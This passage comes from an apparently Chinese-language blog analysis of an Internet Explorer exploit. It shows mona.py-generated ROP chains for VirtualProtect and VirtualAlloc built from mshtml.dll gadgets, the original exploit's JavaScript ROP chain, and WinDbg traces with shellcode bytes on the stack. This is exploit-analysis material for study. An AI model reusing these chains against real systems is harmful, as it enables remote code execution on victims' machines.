(C:\\Windows\\system32\\SHLWAPI.dll)</span><br><span class=\"line\"> 0x75780000 | 0x75796000 | 0x00016000 | False  | True    | True  |  True    | True   | 6.1.7600.16385 [CRYPTSP.dll] (C:\\Windows\\system32\\CRYPTSP.dll)</span><br><span class=\"line\"> 0x774d0000 | 0x77599000 | 0x000c9000 | False  | True    | True  |  True    | True   | 6.1.7601.17514 [USER32.dll] (C:\\Windows\\system32\\USER32.dll)</span><br><span class=\"line\"> 0x70520000 | 0x70528000 | 0x00008000 | False  | True    | True  |  True    | True   | 6.1.7600.16385 [msacm32.drv] (C:\\Windows\\system32\\msacm32.drv)</span><br><span class=\"line\"> 0x76440000 | 0x7645f000 | 0x0001f000 | False  | True    | True  |  True    | True   | 6.1.7601.17514 [IMM32.DLL] (C:\\Windows\\system32\\IMM32.DLL)</span><br><span class=\"line\"> 0x77b30000 | 0x77bab000 | 0x0007b000 | False  | True    | True  |  True    | True   | 6.1.7601.17514 [comdlg32.dll] (C:\\Windows\\system32\\comdlg32.dll)</span><br><span class=\"line\"> 0x6bc20000 | 0x6bc4e000 | 0x0002e000 | False  | True    | True  |  True    | True   | 6.1.7600.16385 [MLANG.dll] (C:\\Windows\\system32\\MLANG.dll)</span><br><span class=\"line\"> 0x71a20000 | 0x71a4a000 | 0x0002a000 | False  | True    | True  |  True    | True   | 3.10.349.0 [msls31.dll] (C:\\Windows\\System32\\msls31.dll)</span><br><span class=\"line\"> 0x75520000 | 0x7555b000 | 0x0003b000 | False  | True    | True  |  True    | True   | 6.1.7600.16385 [rsaenh.dll] (C:\\Windows\\system32\\rsaenh.dll)</span><br><span class=\"line\"> 0x74980000 | 0x74a75000 | 0x000f5000 | False  | True    | True  |  True    | True   | 7.0.7601.17514 [propsys.dll] (C:\\Windows\\system32\\propsys.dll)</span><br><span class=\"line\"> 0x74540000 | 0x74561000 | 0x00021000 | False  | True    | True  |  True    | True   | 6.1.7600.16385 [ntmarta.dll] (C:\\Windows\\system32\\ntmarta.dll)</span><br><span class=\"line\"> 0x704b0000 | 0x704b7000 | 0x00007000 | False  | True    | True  |  True    | True   | 6.1.7600.16385 [midimap.dll] (C:\\Windows\\system32\\midimap.dll)</span><br><span class=\"line\"> 0x74940000 | 0x74980000 | 0x00040000 | False  | True    | True  |  True    | True   | 6.1.7600.16385 [uxtheme.dll] (C:\\Windows\\system32\\uxtheme.dll)</span><br><span class=\"line\"> 0x73be0000 | 0x73beb000 | 0x0000b000 | False  | True    | True  |  True    | True   | 6.1.7600.16385 [msimtf.dll] (C:\\Windows\\system32\\msimtf.dll)</span><br><span class=\"line\"> 0x77d50000 | 0x77ddf000 | 0x0008f000 | False  | True    | True  |  True    | True   | 6.1.7601.17514 [OLEAUT32.dll] (C:\\Windows\\system32\\OLEAUT32.dll)</span><br><span class=\"line\"> 0x75cd0000 | 0x75cdb000 | 0x0000b000 | False  | True    | True  |  True    | True   | 6.1.7600.16385 [profapi.dll] (C:\\Windows\\system32\\profapi.dll)</span><br><span class=\"line\"> 0x76570000 | 0x771ba000 | 0x00c4a000 | False  | True    | True  |  True    | True   | 6.1.7601.17514 [SHELL32.dll] (C:\\Windows\\system32\\SHELL32.dll)</span><br><span class=\"line\"> 0x764c0000 | 0x76561000 | 0x000a1000 | False  | True    | True  |  True    | True   | 6.1.7601.17514 [RPCRT4.dll] (C:\\Windows\\system32\\RPCRT4.dll)</span><br><span class=\"line\"> 0x760e0000 | 0x76115000 | 0x00035000 | False  | True    | True  |  True    | True   | 6.1.7601.17514 [ws2_32.DLL] (C:\\Windows\\system32\\ws2_32.DLL)</span><br><span class=\"line\"> 0x778a0000 | 0x77923000 | 0x00083000 | False  | True    | True  |  True    | True   | 2001.12.8530.16385 [CLBCatQ.DLL] (C:\\Windows\\system32\\CLBCatQ.DLL)</span><br><span class=\"line\"> 0x74b40000 | 0x74cde000 | 0x0019e000 | False  | True    | True  |  True    | True   | 6.10.7601.17514 [comctl32.dll] (C:\\Windows\\WinSxS\\x86_microsoft.windows.common-controls_6595b64144ccf1df_6.0.7601.17514_none_41e6975e2bd6f2b2\\comctl32.dll)</span><br><span class=\"line\"> 0x70520000 | 0x70528000 | 0x00008000 | False  | True    | True  |  True    | True   | 6.1.7600.16385 [MSACM32.dll] (C:\\Windows\\system32\\msacm32.drv)</span><br><span class=\"line\"> 0x76190000 | 0x76196000 | 0x00006000 | False  | True    | True  |  True    | True   | 6.1.7600.16385 [NSI.dll] (C:\\Windows\\system32\\NSI.dll)</span><br><span class=\"line\"> 0x76120000 | 0x76165000 | 0x00045000 | False  | True    | True  |  True    | True   | 6.1.7601.17514 [WLDAP32.dll] (C:\\Windows\\system32\\WLDAP32.dll)</span><br><span class=\"line\"> 0x772c0000 | 0x7738c000 | 0x000cc000 | False  | True    | True  |  True    | True   | 6.1.7600.16385 [MSCTF.dll] (C:\\Windows\\system32\\MSCTF.dll)</span><br><span class=\"line\"> 0x75e40000 | 0x75e8a000 | 0x0004a000 | False  | True    | True  |  True    | True   | 6.1.7601.17514 [KERNELBASE.dll] (C:\\Windows\\system32\\KERNELBASE.dll)</span><br><span class=\"line\"> 0x75c60000 | 0x75cbf000 | 0x0005f000 | False  | True    | True  |  True    | True   | 6.1.7601.17514 [SXS.DLL] (C:\\Windows\\system32\\SXS.DLL)</span><br><span class=\"line\"> 0x720c0000 | 0x720f2000 | 0x00032000 | False  | True    | True  |  True    | True   | 6.1.7601.17514 [WINMM.dll] (C:\\Windows\\system32\\WINMM.dll)</span><br><span class=\"line\"> 0x75cc0000 | 0x75cce000 | 0x0000e000 | False  | True    | True  |  True    | True   | 6.1.7601.17514 [RpcRtRemote.dll] (C:\\Windows\\system32\\RpcRtRemote.dll)</span><br><span class=\"line\"> 0x75e90000 | 0x75eb7000 | 0x00027000 | False  | True    | True  |  True    | True   | 6.1.7601.17514 [CFGMGR32.dll] (C:\\Windows\\system32\\CFGMGR32.dll)</span><br><span class=\"line\"> 0x77d00000 | 0x77d4e000 | 0x0004e000 | False  | True    | True  |  True    | True   | 6.1.7601.17514 [GDI32.dll] (C:\\Windows\\system32\\GDI32.dll)</span><br><span class=\"line\"> 0x75600000 | 0x75644000 | 0x00044000 | False  | True    | True  |  True    | True   | 6.1.7601.17514 [dnsapi.DLL] (C:\\Windows\\system32\\dnsapi.DLL)</span><br><span class=\"line\"> 0x00130000 | 0x001d6000 | 0x000a6000 | False  | True    | True  |  False   | False  | 8.0.7601.17514 [iexplore.exe] (C:\\Program Files\\Internet Explorer\\iexplore.exe)</span><br><span class=\"line\"> 0x750b0000 | 0x750b9000 | 0x00009000 | False  | True    | True  |  True    | True   | 6.1.7600.16385 [VERSION.dll] (C:\\Windows\\System32\\VERSION.dll)</span><br><span class=\"line\"> 0x77660000 | 0x77700000 | 0x000a0000 | False  | True    | True  |  True    | True   | 6.1.7601.17514 [ADVAPI32.dll] (C:\\Windows\\system32\\ADVAPI32.dll)</span><br><span class=\"line\"> 0x77700000 | 0x7789d000 | 0x0019d000 | False  | True    | True  |  True    | True   | 6.1.7601.17514 [SETUPAPI.dll] (C:\\Windows\\system32\\SETUPAPI.dll)</span><br><span class=\"line\"> 0x73b10000 | 0x73b45000 | 0x00035000 | False  | True    | True  |  True    | False  | 8.0.7601.17514 [IEShims.dll] (C:\\Program Files\\Internet Explorer\\IEShims.dll)</span><br><span class=\"line\"> 0x72a10000 | 0x72a4c000 | 0x0003c000 | False  | True    | True  |  True    | True   | 7.0.0.0 [OLEACC.dll] (C:\\Windows\\system32\\OLEACC.dll)</span><br><span class=\"line\">-----------------------------------------------------------------------------------------------------------------------------------------</span><br><span class=\"line\"></span><br><span class=\"line\">################################################################################</span><br><span class=\"line\"></span><br><span class=\"line\">Register setup for VirtualProtect() :</span><br><span class=\"line\">--------------------------------------------</span><br><span class=\"line\"> EAX = NOP (0x90909090)</span><br><span class=\"line\"> ECX = lpOldProtect (ptr to W address)</span><br><span class=\"line\"> EDX = NewProtect (0x40)</span><br><span class=\"line\"> EBX = dwSize</span><br><span class=\"line\"> ESP = lPAddress (automatic)</span><br><span class=\"line\"> EBP = ReturnTo (ptr to jmp esp)</span><br><span class=\"line\"> ESI = ptr to VirtualProtect()</span><br><span class=\"line\"> EDI = ROP NOP (RETN)</span><br><span class=\"line\"> --- alternative chain ---</span><br><span class=\"line\"> EAX = ptr to &amp;VirtualProtect()</span><br><span class=\"line\"> ECX = lpOldProtect (ptr to W address)</span><br><span class=\"line\"> EDX = NewProtect (0x40)</span><br><span class=\"line\"> EBX = dwSize</span><br><span class=\"line\"> ESP = lPAddress (automatic)</span><br><span class=\"line\"> EBP = POP (skip 4 bytes)</span><br><span class=\"line\"> ESI = ptr to JMP [EAX]</span><br><span class=\"line\"> EDI = ROP NOP (RETN)</span><br><span class=\"line\"> + place ptr to &quot;jmp esp&quot; on stack, below PUSHAD</span><br><span class=\"line\">--------------------------------------------</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">ROP Chain for VirtualProtect() [(XP/2003 Server and up)] :</span><br><span class=\"line\">----------------------------------------------------------</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">*** [ JavaScript ] ***</span><br><span class=\"line\"></span><br><span class=\"line\">  //rop chain generated with mona.py - www.corelan.be</span><br><span class=\"line\">  rop_gadgets = unescape(</span><br><span class=\"line\">    &quot;%u1f9f%u6b72&quot; + // 0x6b721f9f : ,# POP EBP # RETN [mshtml.dll] </span><br><span class=\"line\">    &quot;%u1f9f%u6b72&quot; + // 0x6b721f9f : ,# skip 4 bytes [mshtml.dll]</span><br><span class=\"line\">    &quot;%u0f52%u6b43&quot; + // 0x6b430f52 : ,# POP EAX # RETN [mshtml.dll] </span><br><span class=\"line\">    &quot;%ufdff%uffff&quot; + // 0xfffffdff : ,# Value to negate, will become 0x00000201</span><br><span class=\"line\">    &quot;%u5e7f%u6b6f&quot; + // 0x6b6f5e7f : ,# NEG EAX # RETN [mshtml.dll] </span><br><span class=\"line\">    &quot;%u9a2e%u6b7f&quot; + // 0x6b7f9a2e : ,# XCHG EAX,EBX # RETN [mshtml.dll] </span><br><span class=\"line\">    &quot;%ud820%u6b2e&quot; + // 0x6b2ed820 : ,# POP EAX # RETN [mshtml.dll] </span><br><span class=\"line\">    &quot;%uffc0%uffff&quot; + // 0xffffffc0 : ,# Value to negate, will become 0x00000040</span><br><span class=\"line\">    &quot;%u2269%u6b2d&quot; + // 0x6b2d2269 : ,# NEG EAX # RETN [mshtml.dll] </span><br><span class=\"line\">    &quot;%u8ccd%u6b69&quot; + // 0x6b698ccd : ,# XCHG EAX,EDX # RETN [mshtml.dll] </span><br><span class=\"line\">    &quot;%ucf01%u6b33&quot; + // 0x6b33cf01 : ,# POP ECX # RETN [mshtml.dll] </span><br><span class=\"line\">    &quot;%ub6ce%u6b80&quot; + // 0x6b80b6ce : ,# &amp;Writable location [mshtml.dll]</span><br><span class=\"line\">    &quot;%ueffe%u6b50&quot; + // 0x6b50effe : ,# POP EDI # RETN [mshtml.dll] </span><br><span class=\"line\">    &quot;%u38e2%u6b45&quot; + // 0x6b4538e2 : ,# RETN (ROP NOP) [mshtml.dll]</span><br><span class=\"line\">    &quot;%u5e4f%u6b4f&quot; + // 0x6b4f5e4f : ,# POP ESI # RETN [mshtml.dll] </span><br><span class=\"line\">    &quot;%uc0a3%u6b2d&quot; + // 0x6b2dc0a3 : ,# JMP [EAX] [mshtml.dll]</span><br><span class=\"line\">    &quot;%u0f16%u6b43&quot; + // 0x6b430f16 : ,# POP EAX # RETN [mshtml.dll] </span><br><span class=\"line\">    &quot;%u1348%u6b2d&quot; + // 0x6b2d1348 : ,# ptr to &amp;VirtualProtect() [IAT mshtml.dll]</span><br><span class=\"line\">    &quot;%udfb8%u6b51&quot; + // 0x6b51dfb8 : ,# PUSHAD # RETN [mshtml.dll] </span><br><span class=\"line\">    &quot;%u0b54%u6b32&quot; + // 0x6b320b54 : ,# ptr to &apos;jmp esp&apos; [mshtml.dll]</span><br><span class=\"line\">    &quot;&quot;); //  : </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">--------------------------------------------------------------------------------------------------</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">################################################################################</span><br><span class=\"line\"></span><br><span class=\"line\">Register setup for VirtualAlloc() :</span><br><span class=\"line\">--------------------------------------------</span><br><span class=\"line\"> EAX = NOP (0x90909090)</span><br><span class=\"line\"> ECX = flProtect (0x40)</span><br><span class=\"line\"> EDX = flAllocationType (0x1000)</span><br><span class=\"line\"> EBX = dwSize</span><br><span class=\"line\"> ESP = lpAddress (automatic)</span><br><span class=\"line\"> EBP = ReturnTo (ptr to jmp esp)</span><br><span class=\"line\"> ESI = ptr to VirtualAlloc()</span><br><span class=\"line\"> EDI = ROP NOP (RETN)</span><br><span class=\"line\"> --- alternative chain ---</span><br><span class=\"line\"> EAX = ptr to &amp;VirtualAlloc()</span><br><span class=\"line\"> ECX = flProtect (0x40)</span><br><span class=\"line\"> EDX = flAllocationType (0x1000)</span><br><span class=\"line\"> EBX = dwSize</span><br><span class=\"line\"> ESP = lpAddress (automatic)</span><br><span class=\"line\"> EBP = POP (skip 4 bytes)</span><br><span class=\"line\"> ESI = ptr to JMP [EAX]</span><br><span class=\"line\"> EDI = ROP NOP (RETN)</span><br><span class=\"line\"> + place ptr to &quot;jmp esp&quot; on stack, below PUSHAD</span><br><span class=\"line\">--------------------------------------------</span><br><span class=\"line\">// pushad的顺序如下：EAX、ECX、EDX、EBX、ESP、EBP、ESI、EDI</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">ROP Chain for VirtualAlloc() [(XP/2003 Server and up)] :</span><br><span class=\"line\">--------------------------------------------------------</span><br><span class=\"line\"></span><br><span class=\"line\">*** [ JavaScript ] ***</span><br><span class=\"line\"></span><br><span class=\"line\">  //rop chain generated with mona.py - www.corelan.be</span><br><span class=\"line\">  rop_gadgets = unescape(</span><br><span class=\"line\">    &quot;%uc897%u6b6c&quot; + // 0x6b6cc897 : ,# POP EBP # RETN [mshtml.dll] </span><br><span class=\"line\">    &quot;%uc897%u6b6c&quot; + // 0x6b6cc897 : ,# skip 4 bytes [mshtml.dll]</span><br><span class=\"line\">    &quot;%u0eba%u6b43&quot; + // 0x6b430eba : ,# POP EAX # RETN [mshtml.dll] </span><br><span class=\"line\">    &quot;%uffff%uffff&quot; + // 0xffffffff : ,# Value to negate, will become 0x00000001</span><br><span class=\"line\">    &quot;%u4b13%u6b3d&quot; + // 0x6b3d4b13 : ,# NEG EAX # RETN [mshtml.dll] </span><br><span class=\"line\">    &quot;%ue023%u6b54&quot; + // 0x6b54e023 : ,# XCHG EAX,EBX # RETN [mshtml.dll] </span><br><span class=\"line\">    &quot;%u1c7b%u6b61&quot; + // 0x6b611c7b : ,# POP EAX # RETN [mshtml.dll] </span><br><span class=\"line\">    &quot;%u0ffb%u7ff9&quot; + // 0x7ff90ffb : ,# put delta into eax (-&gt; put 0x00001000 into edx)</span><br><span class=\"line\">    &quot;%u2021%u6b64&quot; + // 0x6b642021 : ,# ADD EAX,80070005 # POP EBP # RETN 0x08 [mshtml.dll] </span><br><span class=\"line\">    &quot;%u4141%u4141&quot; + // 0x41414141 : ,# Filler (compensate)</span><br><span class=\"line\">    &quot;%u8ccd%u6b69&quot; + // 0x6b698ccd : ,# XCHG EAX,EDX # RETN [mshtml.dll] </span><br><span class=\"line\">    &quot;%u4141%u4141&quot; + // 0x41414141 : ,# Filler (RETN offset compensation)</span><br><span class=\"line\">    &quot;%u4141%u4141&quot; + // 0x41414141 : ,# Filler (RETN offset compensation)</span><br><span class=\"line\">    &quot;%u0e1a%u6b43&quot; + // 0x6b430e1a : ,# POP EAX # RETN [mshtml.dll] </span><br><span class=\"line\">    &quot;%uffc0%uffff&quot; + // 0xffffffc0 : ,# Value to negate, will become 0x00000040</span><br><span class=\"line\">    &quot;%u4a30%u6b6f&quot; + // 0x6b6f4a30 : ,# NEG EAX # RETN [mshtml.dll] </span><br><span class=\"line\">    &quot;%u13dc%u6b48&quot; + // 0x6b4813dc : ,# XCHG EAX,ECX # RETN [mshtml.dll] </span><br><span class=\"line\">    &quot;%ud541%u6b32&quot; + // 0x6b32d541 : ,# POP EDI # RETN [mshtml.dll] </span><br><span class=\"line\">    &quot;%u38e2%u6b45&quot; + // 0x6b4538e2 : ,# RETN (ROP NOP) [mshtml.dll]</span><br><span class=\"line\">    &quot;%u8b9c%u6b56&quot; + // 0x6b568b9c : ,# POP ESI # RETN [mshtml.dll] </span><br><span class=\"line\">    &quot;%uc0a3%u6b2d&quot; + // 0x6b2dc0a3 : ,# JMP [EAX] [mshtml.dll]</span><br><span class=\"line\">    &quot;%u0ede%u6b43&quot; + // 0x6b430ede : ,# POP EAX # RETN [mshtml.dll] </span><br><span class=\"line\">    &quot;%u134c%u6b2d&quot; + // 0x6b2d134c : ,# ptr to &amp;VirtualAlloc() [IAT mshtml.dll]</span><br><span class=\"line\">    &quot;%udfb8%u6b51&quot; + // 0x6b51dfb8 : ,# PUSHAD # RETN [mshtml.dll] </span><br><span class=\"line\">    &quot;%u0b54%u6b32&quot; + // 0x6b320b54 : ,# ptr to &apos;jmp esp&apos; [mshtml.dll]</span><br><span class=\"line\">    &quot;&quot;); //  : </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">--------------------------------------------------------------------------------------------------</span><br></pre></td></tr></table></figure>\n<p>首先输出了每个模块的安全机制开启的信息，然后输出支持不同PL的ROP链。</p>\n<p>为了看懂原始exp的ROP链构造，此处有两个tip：</p>\n<ol>\n<li>pushad的压栈顺序：EAX、ECX、EDX、EBX、ESP（初始值）、EBP、ESI、EDI</li>\n<li>popad的出栈顺序：EDI、ESI、EBP、ESP（初始值）、EBX、EDX、ECX、EAX</li>\n</ol>\n<p>看一下原始exp给的rop链吧：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//ROP链中的Gadget地址和参数布局，以实现栈转移和DEP绕过</span></span><br><span class=\"line\">shellcode+= <span class=\"built_in\">unescape</span>(<span class=\"string\">\"%u\"</span>+rop1+<span class=\"string\">\"%u\"</span>+rop2); <span class=\"comment\">// RETN</span></span><br><span class=\"line\">shellcode+= <span class=\"built_in\">unescape</span>(<span class=\"string\">\"%u\"</span>+rop3+<span class=\"string\">\"%u\"</span>+rop4); <span class=\"comment\">// POP EBP</span></span><br><span class=\"line\">shellcode+= <span class=\"built_in\">unescape</span>(<span class=\"string\">\"%u\"</span>+rop5+<span class=\"string\">\"%u\"</span>+rop6); <span class=\"comment\">// XCHG EAX,ESP|call [eax + 8] then goto rop1</span></span><br><span class=\"line\">shellcode+= <span class=\"built_in\">unescape</span>(<span class=\"string\">\"%u\"</span>+rop3+<span class=\"string\">\"%u\"</span>+rop4); <span class=\"comment\">// POP EBP \t</span></span><br><span class=\"line\">shellcode+= <span class=\"built_in\">unescape</span>(<span class=\"string\">\"%u\"</span>+rop3+<span class=\"string\">\"%u\"</span>+rop4); <span class=\"comment\">// POP EBP</span></span><br><span class=\"line\">shellcode+= <span class=\"built_in\">unescape</span>(<span class=\"string\">\"%u\"</span>+rop7+<span class=\"string\">\"%u\"</span>+rop8); <span class=\"comment\">// POP EBX</span></span><br><span class=\"line\">shellcode+= <span class=\"built_in\">unescape</span>(<span class=\"string\">\"%u1024%u0000\"</span>); <span class=\"comment\">// Size 0x00001024</span></span><br><span class=\"line\">shellcode+= <span class=\"built_in\">unescape</span>(<span class=\"string\">\"%u\"</span>+rop9+<span class=\"string\">\"%u\"</span>+rop10); <span class=\"comment\">// POP EDX</span></span><br><span class=\"line\">shellcode+= <span class=\"built_in\">unescape</span>(<span class=\"string\">\"%u0040%u0000\"</span>); <span class=\"comment\">// 0x00000040</span></span><br><span class=\"line\">shellcode+= <span class=\"built_in\">unescape</span>(<span class=\"string\">\"%u\"</span>+rop11+<span class=\"string\">\"%u\"</span>+rop12); <span class=\"comment\">// POP ECX</span></span><br><span class=\"line\">shellcode+= <span class=\"built_in\">unescape</span>(<span class=\"string\">\"%u\"</span>+writable1+<span class=\"string\">\"%u\"</span>+writable2); <span class=\"comment\">// Writable Location</span></span><br><span class=\"line\">shellcode+= <span class=\"built_in\">unescape</span>(<span class=\"string\">\"%u\"</span>+rop13+<span class=\"string\">\"%u\"</span>+rop14); <span class=\"comment\">// POP EDI</span></span><br><span class=\"line\">shellcode+= <span class=\"built_in\">unescape</span>(<span class=\"string\">\"%u\"</span>+rop1+<span class=\"string\">\"%u\"</span>+rop2); <span class=\"comment\">// RET</span></span><br><span class=\"line\">shellcode+= <span class=\"built_in\">unescape</span>(<span class=\"string\">\"%u\"</span>+rop15+<span class=\"string\">\"%u\"</span>+rop16); <span class=\"comment\">// POP ESI</span></span><br><span class=\"line\">shellcode+= <span class=\"built_in\">unescape</span>(<span class=\"string\">\"%u\"</span>+jmpeax1+<span class=\"string\">\"%u\"</span>+jmpeax2); <span class=\"comment\">// JMP EAX</span></span><br><span class=\"line\">shellcode+= <span class=\"built_in\">unescape</span>(<span class=\"string\">\"%u\"</span>+rop17+<span class=\"string\">\"%u\"</span>+rop18); <span class=\"comment\">// POP EAX</span></span><br><span class=\"line\">shellcode+= <span class=\"built_in\">unescape</span>(<span class=\"string\">\"%u\"</span>+vp1+<span class=\"string\">\"%u\"</span>+vp2); <span class=\"comment\">// VirtualProtect()</span></span><br><span class=\"line\">shellcode+= <span class=\"built_in\">unescape</span>(<span class=\"string\">\"%u\"</span>+rop19+<span class=\"string\">\"%u\"</span>+rop20); <span class=\"comment\">// MOV EAX,DWORD PTR DS:[EAX]</span></span><br><span class=\"line\">shellcode+= <span class=\"built_in\">unescape</span>(<span class=\"string\">\"%u\"</span>+rop21+<span class=\"string\">\"%u\"</span>+rop22); <span class=\"comment\">// PUSHAD</span></span><br><span class=\"line\">shellcode+= <span class=\"built_in\">unescape</span>(<span class=\"string\">\"%u\"</span>+rop23+<span class=\"string\">\"%u\"</span>+rop24); <span class=\"comment\">// PUSH ESP</span></span><br><span class=\"line\">shellcode+= <span class=\"built_in\">unescape</span>(<span class=\"string\">\"%u9090%u9090\"</span>); <span class=\"comment\">// NOPs</span></span><br><span class=\"line\">shellcode+= <span class=\"built_in\">unescape</span>(<span class=\"string\">\"%u9090%u9090\"</span>); <span class=\"comment\">// NOPs</span></span><br><span class=\"line\">shellcode+= <span class=\"built_in\">unescape</span>(<span class=\"string\">\"%u9090%u9090\"</span>); <span class=\"comment\">// NOPs</span></span><br></pre></td></tr></table></figure>\n<p>VirtualProtect函数的函数原型如下：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">BOOL VirtualProtect&#123; </span><br><span class=\"line\">  LPVOID lpAddress, </span><br><span class=\"line\">  DWORD dwsize, </span><br><span class=\"line\">  DWORD flNewProtect, </span><br><span class=\"line\">  PDWORD lpflOldProtect </span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>首先执行一条retn；然后跳过 ；然后pop ebp，跳过下一条pop ebp的指令并将ebp赋值为pop ebp的地址；然后pop ebx，设置为0x1024；pop edx，设置为0x40；pop ecx，设置为一个可写的位置（写入shellcode）；pop edi，将edi设置为一条ret的地址；然后pop esi，将esi设置为jmp eax的地址；然后pop eax，令eax = VirtualProtect的地址。</p>\n<p>总结一下：</p>\n<p>EAX: VirtualProtect的IAT</p>\n<p>ECX: 要修改的地址，注意这个地址是根据之前预测命中的位置计算出来的</p>\n<p>EDX: flProtect(0x40)</p>\n<p>EBX: dwSize(0x1024)</p>\n<p>ESP: 当前栈顶的位置</p>\n<p>EBP: pop ebp;ret</p>\n<p>ESI: jmp eax;ret</p>\n<p>EDI: ret</p>\n<p>然后MOV EAX,DWORD PTR DS:[EAX]会将VirtualProtect函数的真实地址赋值给EAX寄存器，然后执行pushad，将上述寄存器的值压栈。调试跟一下：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">0:005&gt; dd esp</span><br><span class=\"line\">079f6dcc  6b661041 6b66f920 6b662c60 079f6dec</span><br><span class=\"line\">079f6ddc  00001024 00000040 6bb9fe20 76042341</span><br><span class=\"line\">079f6dec  6b6c3d7e 90909090 90909090 90909090</span><br></pre></td></tr></table></figure>\n<p>pushad后，栈顶是ret指令。连续执行两次ret，此时：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">0:005&gt; p</span><br><span class=\"line\">eax=76042341 ebx=00001024 ecx=6bb9fe20 edx=00000040 esi=6b66f920 edi=6b661041</span><br><span class=\"line\">eip=6b66f920 esp=079f6dd4 ebp=6b662c60 iopl=0         nv up ei pl nz na po nc</span><br><span class=\"line\">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202</span><br><span class=\"line\">mshtml!_tailMerge_CRYPT32_dll+0xf:</span><br><span class=\"line\">6b66f920 ffe0            jmp     eax &#123;kernel32!VirtualProtectStub (76042341)&#125;</span><br><span class=\"line\">0:005&gt; dd esp</span><br><span class=\"line\">079f6dd4  6b662c60 079f6dec 00001024 00000040</span><br><span class=\"line\">079f6de4  6bb9fe20 76042341 6b6c3d7e 90909090</span><br><span class=\"line\">079f6df4  90909090 90909090 0089e8fc 89600000</span><br><span class=\"line\">079f6e04  64d231e5 8b30528b 528b0c52 28728b14</span><br><span class=\"line\">079f6e14  264ab70f c031ff31 7c613cac c1202c02</span><br><span class=\"line\">079f6e24  c7010dcf 5752f0e2 8b10528b d0013c42</span><br><span class=\"line\">079f6e34  8578408b 014a74c0 488b50d0 20588b18</span><br><span class=\"line\">079f6e44  3ce3d301 8b348b49 ff31d601 c1acc031</span><br></pre></td></tr></table></figure>\n<p>会跳转到jmp eax执行VirtualProtect，参数lpAddress为可写地址0x079f6dec，size为0x1024，flProtect为0x40，函数执行完之后执行pop ebp；ret（注意VirtualProctect函数在返回时执行ret 0x10，自动平衡了堆栈）。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">0:005&gt; p</span><br><span class=\"line\">eax=00000001 ebx=00001024 ecx=079f6d90 edx=77bf70b4 esi=6b66f920 edi=6b661041</span><br><span class=\"line\">eip=75e622d6 esp=079f6dd4 ebp=6b662c60 iopl=0         nv up ei pl nz na po nc</span><br><span class=\"line\">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202</span><br><span class=\"line\">KERNELBASE!VirtualProtect+0x19:</span><br><span class=\"line\">75e622d6 c21000          ret     10h</span><br><span class=\"line\">0:005&gt; p</span><br><span class=\"line\">eax=00000001 ebx=00001024 ecx=079f6d90 edx=77bf70b4 esi=6b66f920 edi=6b661041</span><br><span class=\"line\">eip=6b662c60 esp=079f6de8 ebp=6b662c60 iopl=0         nv up ei pl nz na po nc</span><br><span class=\"line\">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202</span><br><span class=\"line\">mshtml!StringCchPrintfA+0x58:</span><br><span class=\"line\">6b662c60 5d              pop     ebp</span><br><span class=\"line\">0:005&gt; dd esp</span><br><span class=\"line\">079f6de8  76042341 6b6c3d7e 90909090 90909090</span><br><span class=\"line\">079f6df8  90909090 0089e8fc 89600000 64d231e5</span><br><span class=\"line\">079f6e08  8b30528b 528b0c52 28728b14 264ab70f</span><br><span class=\"line\">079f6e18  c031ff31 7c613cac c1202c02 c7010dcf</span><br><span class=\"line\">079f6e28  5752f0e2 8b10528b d0013c42 8578408b</span><br><span class=\"line\">079f6e38  014a74c0 488b50d0 